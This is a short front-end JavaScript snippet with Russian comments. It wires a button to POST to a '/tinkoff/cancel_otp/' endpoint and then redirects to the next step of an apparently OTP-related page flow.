document.addEventListener("DOMContentLoaded", () => {
    // Извлечение имени пользователя
    const userNameElement = document.getElementById("form-title");
    const userName = userNameElement ? userNameElement.dataset.name : "Пользователь"; 

    // Функция для отправки запроса на бэкенд
    const sendRequestToBackend = async (endpoint, button) => {
        button.disabled = true;

        try {
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            });
            
            const data = await response.json();
            
            if (data.status === 'success') {
                const pageType = data.next_page_type;
                window.location.href = `/tinkoff/next/?step=${pageType}`;
            } else {
                alert(data.detail || 'Произошла ошибка.');
            }
        } catch (error) {
            alert('Ошибка сети. Попробуйте снова.');
            console.error('Ошибка:', error);
        } finally {
            button.disabled = false;
        }
    };

    // Обработчик для кнопки "Я не ..."
    document.getElementById("reset-button").addEventListener("click", (event) => {
        const button = event.target;
        sendRequestToBackend("/tinkoff/cancel_otp/", button);
    });
});